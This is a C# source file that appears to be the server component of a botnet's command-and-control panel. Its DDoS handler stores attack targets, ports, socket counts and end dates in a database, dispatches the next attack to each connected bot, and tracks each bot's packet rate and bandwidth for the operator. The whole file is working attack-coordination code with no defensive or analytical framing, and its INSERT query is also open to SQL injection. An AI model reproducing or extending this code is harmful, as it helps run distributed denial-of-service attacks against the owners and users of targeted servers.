using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Text;
using Server.Core.Network;

namespace Server.Core.Handlers
{
	struct SDdosInfo
	{
		public int iPPS;
		public int iRate;
	}
	
	class CDdos
	{
		#region VARIABLES
		public int AttackID = -1;
		public string AttackHost;
		public int AttackPort;
		public int AttackType;
		public DateTime? StartDate, EndDate;
        public int AttackSockets;
        public int AttackInterval;
		
		/// <summary>
		/// Holds the bots which have executed the current ddos task.
		/// You need to Add on Confirmation from bot and Remove on disconnect
		/// </summary>
		public KeyValuePair<CClient, SDdosInfo>[] ExecutedBy = null;
		#endregion
		
		public CDdos(int iID, String strHost, int iPort, int iType, DateTime Start, DateTime? End, int iSockets, int iInterval)
		{
			this.AttackID = iID;
			this.AttackHost = strHost;
			this.AttackPort = iPort;
			this.AttackType = iType;
			this.StartDate = Start;
			this.EndDate = End;
            this.AttackSockets = iSockets;
            this.AttackInterval = iInterval;
		}

		public override string ToString()
		{
            string strData = string.Format(
                "{0}|{1}|{2}|{3}|{4}|{5}",
                this.AttackID, this.AttackHost, this.AttackPort, AttackType, AttackSockets, AttackInterval
                );

            if(this.EndDate.HasValue)
            {
                TimeSpan tpDifference = EndDate.Value - DateTime.Now;

                strData += string.Format("|{0}", tpDifference.TotalHours);
            }

            return strData;
		}
	}
	
	public class CDdosHandler
	{
		public delegate void delOnDdosStopped(CClient[] Bots, int iAttackID);
		public event delOnDdosStopped OnDdosStopped;
		
		private List<CDdos> m_lstDdos = null;
		
		public CDdosHandler()
		{
			m_lstDdos = new List<CDdos>();
			
			this.LoadFromDatabase();
		}
		
		#region LOAD_FROM_DATABASE
		/// <summary>
		/// Loads attacks from Database in to memory.
		/// </summary>
		private void LoadFromDatabase()
		{
			try
			{
				lock(m_lstDdos)
				{
					m_lstDdos.Clear();
				}
				
				SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery("SELECT * FROM ddos");
				
				if(Result.HasRows)
				{
					while(Result.Read())
					{
						try
						{
							int iID, iPort, iType, iSockets, iInterval;
							string strHost = Result["ddos_host"].ToString();
							
							if(int.TryParse(Result["ddos_id"].ToString(), out iID) &&
							   int.TryParse(Result["ddos_port"].ToString(), out iPort) &&
							   int.TryParse(Result["ddos_type"].ToString(), out iType) &&
                                int.TryParse(Result["ddos_sockets"].ToString(), out iSockets) &&
                                int.TryParse(Result["ddos_interval"].ToString(), out iInterval))
							{
								DateTime StartDate;
								DateTime? EndDate = null;
								
								string strStopDate = Result["ddos_stop"].ToString();
								
								if(DateTime.TryParse(Result["ddos_start"].ToString(), out StartDate))
								{
									if(strStopDate != "Never")
									{
										DateTime TempEndDate;
										if(!DateTime.TryParse(strStopDate, out TempEndDate))
											continue;
										EndDate = TempEndDate;
									}
									
									lock(m_lstDdos)
									{
										m_lstDdos.Add(new CDdos(iID, strHost, iPort, iType, StartDate, EndDate, iSockets, iInterval));
									}
								}
							}
						}
						catch {}
					}
					
					Console.WriteLine("[DDOS_SYSTEM] Data loaded from database in to memory.");
				}
			}
			catch {}
		}
		#endregion
		
		#region SET_EXECUTED_BY_BOT
		/// <summary>
		/// Registers that the bot is running a ddos attack based on attack id
		/// Call this when bot sends you confirmation that attack is started.
		/// </summary>
		/// <param name="Bot">Bot</param>
		/// <param name="iAttackID">Ddos Attack ID</param>
		public void SetExecutedByBot(CClient Bot, int iAttackID)
		{
			try
			{
				lock(m_lstDdos)
				{
					for(int i = 0; i < m_lstDdos.Count; i++)
					{
						try
						{
							var Current = m_lstDdos[i];
							
							if(Current.AttackID != iAttackID) continue;
							
							var lstExecuted = new List<KeyValuePair<CClient, SDdosInfo>>();
								
							if(Current.ExecutedBy != null) lstExecuted.AddRange(Current.ExecutedBy);
								
							lstExecuted.Add(new KeyValuePair<CClient, SDdosInfo>(Bot, new SDdosInfo()));
								
							Current.ExecutedBy = lstExecuted.ToArray();
								
							m_lstDdos[i] = Current;
						}
						catch {}
					}
				}
			}
			catch {}
		}
		#endregion
		
		#region INFO_UPDATE
		/// <summary>
		/// Used for updating List with PPS and Rate information.
		/// </summary>
		/// <param name="Bot">Bot that gives this information</param>
		/// <param name="iAttackID">For which Attack</param>
		/// <param name="iPPS">Packet per second information</param>
		/// <param name="iRate">Bandwith rate information</param>
		public void InfoUpdate(CClient Bot, int iAttackID, int iPPS, int iRate)
		{
			try
			{
				lock(m_lstDdos)
				{
					for(int iDdosIndex = 0; iDdosIndex < m_lstDdos.Count; iDdosIndex++)
					{
						try
						{
							var Current = m_lstDdos[iDdosIndex];
							
							if(Current.AttackID != iAttackID) continue;
							
							if(Current.ExecutedBy == null) break;
							
							for(int iExecutedByIndex = 0; iExecutedByIndex < Current.ExecutedBy.Length; iExecutedByIndex++)
							{
								try
								{
									var CurrentBotInfo = Current.ExecutedBy[iExecutedByIndex];
									
									if(CurrentBotInfo.Key != Bot) continue;
									
									var Info = new SDdosInfo();
									Info.iPPS = iPPS;
									Info.iRate = iRate;

									Current.ExecutedBy[iExecutedByIndex] = new KeyValuePair<CClient, SDdosInfo>(Bot, Info);
									
									m_lstDdos[iDdosIndex] = Current;
								} 
								catch {}
							}
						}
						catch {}
						
					}
				}
			}
			catch {}
		}
		#endregion
		
		#region IS_EXECUTED
		/// <summary>
		/// Used to check if an attack is already executed by said bot
		/// </summary>
		/// <param name="Bot"></param>
		/// <param name="Ddos"></param>
		/// <returns></returns>
		private bool IsExecuted(CClient Bot, CDdos Ddos)
		{
			try
			{
				if(Ddos.ExecutedBy == null) 
                    return false;
				
				foreach(var Executed in Ddos.ExecutedBy)
				{
					if(Executed.Key == Bot)
						return true;
				}
			}
			catch {}
			
			return false;
		}
		#endregion
		
		#region GET_NEXT
		/// <summary>
		/// Returns the next non executed attack, this includes START and STOP.
		/// </summary>
		/// <param name="Bot"></param>
		/// <returns></returns>
		public string GetNext(CClient Bot)
		{
			try
			{
				lock(m_lstDdos)
				{
					foreach(var Ddos in m_lstDdos.ToArray())
					{
						if(this.IsExecuted(Bot, Ddos)) continue;
						
						return Ddos.ToString();
					}
				}
			}
			catch {}
			
			return string.Empty;
		}
		#endregion
		
		#region STOP_ATTACK
		/// <summary>
		/// Used to indicate that a said running Ddos attack must be stopped.
		/// </summary>
		/// <param name="iAttackID">Attack ID.</param>
		public void StopAttack(int iAttackID)
		{
			try
			{
				lock(m_lstDdos)
				{
					/*for(int iDdosIndex = 0; iDdosIndex < m_lstDdos.Count; iDdosIndex++)
					{
						try
						{
							var Ddos = m_lstDdos[iDdosIndex];
						
							if(Ddos.AttackID != iAttackID) continue;
						
							Ddos.ExecutedBy = null;
						
							Ddos.TaskType = DDOS_TASK_TYPE.STOP;
						
							m_lstDdos[iDdosIndex] = Ddos;
						}
						catch {}
					}*/
					
					foreach(var Ddos in m_lstDdos.ToArray())
					{
						if(Ddos.AttackID != iAttackID) continue;
						
						List<CClient> lstBots = null;
						
						if(Ddos.ExecutedBy != null)
						{
							lstBots = new List<CClient>();
							foreach(var ActiveBot in Ddos.ExecutedBy)
								lstBots.Add(ActiveBot.Key);
						}
						
						m_lstDdos.Remove(Ddos);
						
						CMain.DatabaseClient.ExecuteNonResultQuery(string.Format("DELETE FROM ddos WHERE ddos_id={0}", Ddos.AttackID));
						
						if(lstBots != null)
							if(OnDdosStopped != null) OnDdosStopped.Invoke(lstBots.ToArray(), iAttackID);
					}
				}
			}
			catch {}
		}
		#endregion
		
		#region SET_NOT_EXECUTED
		/// <summary>
		/// Must be called when a bot disconnets.
		/// This is to support long running attacks.
		/// </summary>
		/// <param name="Bot"></param>
		public void SetNotExecuted(CClient Bot)
		{
			try
			{
				lock(m_lstDdos)
				{
					for(int iDdosIndex = 0; iDdosIndex < m_lstDdos.Count; iDdosIndex++)
					{
						try
						{
							var Ddos = m_lstDdos[iDdosIndex];
							
							if(Ddos.ExecutedBy == null) continue;
							
							var lstExec = new List<KeyValuePair<CClient, SDdosInfo>>();
							lstExec.AddRange(Ddos.ExecutedBy);
							
							foreach(var Data in lstExec.ToArray())
							{
								if(Data.Key == Bot)
									lstExec.Remove(Data);
							}
							
							Ddos.ExecutedBy = lstExec.ToArray();
							
							m_lstDdos[iDdosIndex] = Ddos;
						}
						catch {}
					}
				}
			}
			catch {}
		}
		#endregion
		
		#region GET_DDOS_LIST
		public string GetDdoslist()
		{
			try
			{
				var sbDdosList = new StringBuilder();
				
				lock(m_lstDdos)
				{
					foreach(var Ddos in m_lstDdos.ToArray())
					{
						try
						{
							int iRate = 0;
							int iPPS = 0;
							int iActiveBots = 0;
							
							if(Ddos.ExecutedBy != null)
							{
								iActiveBots = Ddos.ExecutedBy.Length;
								foreach(var ExecutedBy in Ddos.ExecutedBy)
								{
									var DdosInfo = ExecutedBy.Value;
									
									iRate += DdosInfo.iRate;
									iPPS += DdosInfo.iPPS;
								}
							}
							
							string strStartDate = string.Format("{0} {1}", Ddos.StartDate.Value.ToShortDateString(), Ddos.StartDate.Value.ToShortTimeString());
							string strEndDate = Ddos.EndDate == null ? "Never" : string.Format("{0} {1}", Ddos.EndDate.Value.ToShortDateString(), Ddos.EndDate.Value.ToShortTimeString());
							string strTimeLeft = string.Empty;
							
							if(Ddos.EndDate == null)
							{
								strTimeLeft = "Unlimited";
							}
							else
							{
								if(DateTime.Now >= Ddos.EndDate.Value) strTimeLeft = "None";
								else
								{
									TimeSpan TimeLeft = Ddos.EndDate.Value - DateTime.Now;
									
									//strTimeLeft = TimeLeft.ToString();
									strTimeLeft = string.Format("{0}d {1}h {2}m {3}s", TimeLeft.Days, TimeLeft.Hours, TimeLeft.Minutes, TimeLeft.Seconds);
								}
							}
							
							string strStatus = strTimeLeft == "None" ? "Finished" : "Running";

                            string strPPS = string.Format("{0}", iPPS);

                            if(iPPS > 1024)
                            {
                                double dPPS = iPPS;

                                dPPS /= 1024;

                                strPPS = string.Format("{0}k", Math.Round(dPPS, 1, MidpointRounding.AwayFromZero));

                                if (dPPS > 1024)
                                {
                                    dPPS /= 1024;
                                    strPPS = string.Format("{0}kk", Math.Round(dPPS, 1, MidpointRounding.AwayFromZero));
                                }

                                if (dPPS > 1024)
                                {
                                    dPPS /= 1024;
                                    strPPS = string.Format("{0}kkk", Math.Round(dPPS, 1, MidpointRounding.AwayFromZero));
                                }
                            }

                            string strRate = string.Format("{0} B/s", iRate);

                            if(iRate > 1024)
                            {
                                double dRate = iRate;

                                dRate /= 1024;

                                strRate = string.Format("{0} KB/s", Math.Round(dRate, 1, MidpointRounding.AwayFromZero));

                                if(dRate > 1024)
                                {
                                    dRate /= 1024;

                                    strRate = string.Format("{0} MB/s", Math.Round(dRate, 1, MidpointRounding.AwayFromZero));

                                    if(dRate > 1024)
                                    {
                                        dRate /= 1024;

                                        strRate = string.Format("{0} GB/s", Math.Round(dRate, 1, MidpointRounding.AwayFromZero));

                                        if(dRate > 1024)
                                        {
                                            dRate /= 1024;
                                            strRate = string.Format("{0} TB/s", Math.Round(dRate, 1, MidpointRounding.AwayFromZero));
                                        }
                                    }
                                }   
                            }

                            sbDdosList.AppendFormat("{0}*{1}*{2}*{3}*{4}*{5}*{6}*{7}*{8}*{9}*{10}*{11}*{12};",
                       Ddos.AttackID, Ddos.AttackType, Ddos.AttackHost,
                       Ddos.AttackPort, strPPS, strRate, iActiveBots,
                       strStatus, strStartDate, strEndDate, strTimeLeft, Ddos.AttackSockets, Ddos.AttackInterval);
						}
						catch {}
					}
				}
				
				return sbDdosList.ToString();
			}
			catch {}
			return string.Empty;
		}
		#endregion
		
		#region ADD_DDOS
		public bool AddDdos(string strHost, int iPort, int iType, DateTime? EndDate, int iSockets, int iInterval)
		{
			try
			{
				DateTime CurrentDate = DateTime.Now;
				
				string strStartTime = string.Format("{0} {1}", CurrentDate.ToShortDateString(), CurrentDate.ToShortTimeString());
				string strEndTime = EndDate == null ? "Never" : string.Format("{0} {1}", EndDate.Value.ToShortDateString(), EndDate.Value.ToShortTimeString());
				
				SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(
					string.Format(
                    "INSERT INTO ddos(ddos_host, ddos_port, ddos_type, ddos_start, ddos_stop, ddos_sockets, ddos_interval) VALUES('{0}', '{1}', '{2}', '{3}', '{4}', '{5}', '{6}'); SELECT last_insert_rowid()",
					             strHost, iPort, iType, strStartTime, strEndTime, iSockets, iInterval
                                 ));
				
				if(!Result.HasRows)
					return false;
				
				if(!Result.Read())
					return false;
				
				int iID = -1;
				
				if(!int.TryParse(Result[0].ToString(), out iID))
					return false;
				
				lock(m_lstDdos)
				{
					var Ddos = new CDdos(iID, strHost, iPort, iType, DateTime.Now, EndDate, iSockets, iInterval);
					m_lstDdos.Add(Ddos);
				}
				
				Console.WriteLine("New attack added.");
				return true;
			}
			catch {}
			
			return false;
		}
		#endregion
		
		public int GetTotal()
		{
			lock(m_lstDdos)
			{
				return m_lstDdos.Count;
			}
		}
	}
}
